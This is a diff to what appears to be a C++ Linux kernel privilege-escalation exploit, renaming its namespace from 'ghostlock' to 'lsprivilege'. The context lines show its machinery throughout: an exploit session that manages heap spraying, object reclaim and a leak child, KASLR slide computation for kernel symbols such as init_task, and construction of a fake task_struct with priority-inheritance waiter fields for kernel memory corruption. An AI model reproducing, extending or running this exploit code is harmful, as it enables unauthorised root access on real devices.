@@ -13,23 +13,23 @@
  * written with these short names, and references preserve every call site
  * without the macro. */
 namespace {
-    auto &ks = ghostlock::session::g_exploit_session.heap.snitch;
-    auto &mm_objs_per_slab = ghostlock::session::g_exploit_session.heap.mm_objs_per_slab;
-    auto &reclaim_sv = ghostlock::session::g_exploit_session.heap.current.reclaim.fd;
-    auto &prepare_ctx = ghostlock::session::g_exploit_session.heap.prepare;
-    auto &spray_ctx = ghostlock::session::g_exploit_session.heap.spray;
-    auto &pre_ctx = ghostlock::session::g_exploit_session.heap.pre;
-    auto &post_ctx = ghostlock::session::g_exploit_session.heap.post;
-    auto &child_leak = ghostlock::session::g_exploit_session.heap.leak_child;
+    auto &ks = lsprivilege::session::g_exploit_session.heap.snitch;
+    auto &mm_objs_per_slab = lsprivilege::session::g_exploit_session.heap.mm_objs_per_slab;
+    auto &reclaim_sv = lsprivilege::session::g_exploit_session.heap.current.reclaim.fd;
+    auto &prepare_ctx = lsprivilege::session::g_exploit_session.heap.prepare;
+    auto &spray_ctx = lsprivilege::session::g_exploit_session.heap.spray;
+    auto &pre_ctx = lsprivilege::session::g_exploit_session.heap.pre;
+    auto &post_ctx = lsprivilege::session::g_exploit_session.heap.post;
+    auto &child_leak = lsprivilege::session::g_exploit_session.heap.leak_child;
 
     /* The skb buffer is reallocated on every prepare pass, so the pointer is
      * read at each use instead of being bound once. */
     unsigned char *skb_buf() {
-        return ghostlock::session::g_exploit_session.heap.skb_buffer.get();
+        return lsprivilege::session::g_exploit_session.heap.skb_buffer.get();
     }
 } // namespace
 
-namespace ghostlock::support {
+namespace lsprivilege::support {
     static const profile::kernel_offsets *profile_values(void) {
         return session::g_exploit_session.profile.values();
     }
@@ -142,11 +142,11 @@ namespace ghostlock::support {
                    (unsigned long long) session::g_exploit_session.addresses.phys_load(),
                    (unsigned long long) (session::g_exploit_session.addresses.phys_load() -
                                          session::g_exploit_session.addresses.phys_offset),
-                   (unsigned long long) ghostlock::profile::slide_nfulnl_logger(),
-                   (unsigned long long) ghostlock::profile::slide_random_boot_id_data(),
-                   (unsigned long long) ghostlock::profile::slide_init_task(),
-                   (unsigned long long) ghostlock::profile::slide_root_task_group(),
-                   (unsigned long long) ghostlock::profile::slide_sysctl_bootid());
+                   (unsigned long long) lsprivilege::profile::slide_nfulnl_logger(),
+                   (unsigned long long) lsprivilege::profile::slide_random_boot_id_data(),
+                   (unsigned long long) lsprivilege::profile::slide_init_task(),
+                   (unsigned long long) lsprivilege::profile::slide_root_task_group(),
+                   (unsigned long long) lsprivilege::profile::slide_sysctl_bootid());
     }
 
     void disable_rseq_for_thread(void) {
@@ -246,7 +246,7 @@ namespace ghostlock::support {
     pid_t clone_leak_child(void) {
         pid_t child = static_cast<pid_t>(SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0)));
         if (child == 0) {
-            ghostlock::kernelsnitch::context_find_collisions(ks);
+            lsprivilege::kernelsnitch::context_find_collisions(ks);
             exit(0);
         }
         return child;
@@ -362,11 +362,11 @@ namespace ghostlock::support {
         uintptr_t write_right = (session::g_exploit_session.heap.current.fake_right);
         uintptr_t write_left = (session::g_exploit_session.heap.current.fake_left);
         /* Direct-map aliases (data_addr) resolve to the same physical pages and are
-         * dereferenceable on every SoC — the tcp route already uses ghostlock::profile::slide_init_task()
+         * dereferenceable on every SoC — the tcp route already uses lsprivilege::profile::slide_init_task()
          * the same way for the on-stack waiter (upstream U01-D). */
-        uint64_t waiter_task = ghostlock::profile::slide_init_task();
-        uint64_t task_group = ghostlock::profile::slide_root_task_group();
-        uint64_t pi_top_task = ghostlock::profile::slide_init_task();
+        uint64_t waiter_task = lsprivilege::profile::slide_init_task();
+        uint64_t task_group = lsprivilege::profile::slide_root_task_group();
+        uint64_t pi_top_task = lsprivilege::profile::slide_init_task();
 
         const profile::kernel_offsets *v = profile_values();
         int32_t compact = session::g_exploit_session.profile.has_compact_waiter();
@@ -423,25 +423,25 @@ namespace ghostlock::support {
             /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
             uint32_t ft_prio_off = compact
                                        ? v->task.prio
-                                       : ghostlock::profile::fake_task_prio_off();
+                                       : lsprivilege::profile::fake_task_prio_off();
             uint32_t ft_nprio_off = compact
                                         ? v->task.normal_prio
-                                        : ghostlock::profile::fake_task_normal_prio_off();
+                                        : lsprivilege::profile::fake_task_normal_prio_off();
             uint32_t ft_tg_off = compact
                                      ? v->task.sched_task_group
-                                     : ghostlock::profile::fake_task_task_group_off();
+                                     : lsprivilege::profile::fake_task_task_group_off();
             uint32_t ft_pi_lock_off = compact
                                           ? v->task.pi_lock
-                                          : ghostlock::profile::fake_task_pi_lock_off();
+                                          : lsprivilege::profile::fake_task_pi_lock_off();
             uint32_t ft_pi_wait_off = compact
                                           ? v->task.pi_waiters
-                                          : ghostlock::profile::fake_task_pi_waiters_off();
+                                          : lsprivilege::profile::fake_task_pi_waiters_off();
             uint32_t ft_pi_top_off = compact
                                          ? v->task.pi_top_task
-                                         : ghostlock::profile::fake_task_pi_top_task_off();
+                                         : lsprivilege::profile::fake_task_pi_top_task_off();
             uint32_t ft_pi_blocked_off = compact
                                              ? v->task.pi_blocked_on
-                                             : ghostlock::profile::fake_task_pi_blocked_on_off();
+                                             : lsprivilege::profile::fake_task_pi_blocked_on_off();
 
             put32(p, fake_task_off + kernel::FAKE_TASK_USAGE_OFF, 0x100);
             put32(p, fake_task_off + ft_prio_off, kernel::FAKE_TASK_PRIO);
@@ -502,7 +502,7 @@ namespace ghostlock::support {
         int32_t cpu_count = static_cast<int32_t>(sysconf(_SC_NPROCESSORS_ONLN));
         kernelsnitch::KernelSnitchOwner snitch = kernelsnitch::KernelSnitchOwner::create(
             session::g_exploit_session.profile.mm_struct_stride(kernel::MM_STRUCT_SZ),
-            kernel::MM_ORDER, static_cast<size_t>(cpu_count), ghostlock::profile::kernelsnitch_collisions(), 0,
+            kernel::MM_ORDER, static_cast<size_t>(cpu_count), lsprivilege::profile::kernelsnitch_collisions(), 0,
             static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
         /* The forked leak child borrows the shared mmap context through this
          * compatibility alias; the owner remains the only releaser. */
@@ -746,4 +746,4 @@ namespace ghostlock::support {
         }
         return 0;
     }
-} // namespace ghostlock::support
+} // namespace lsprivilege::support
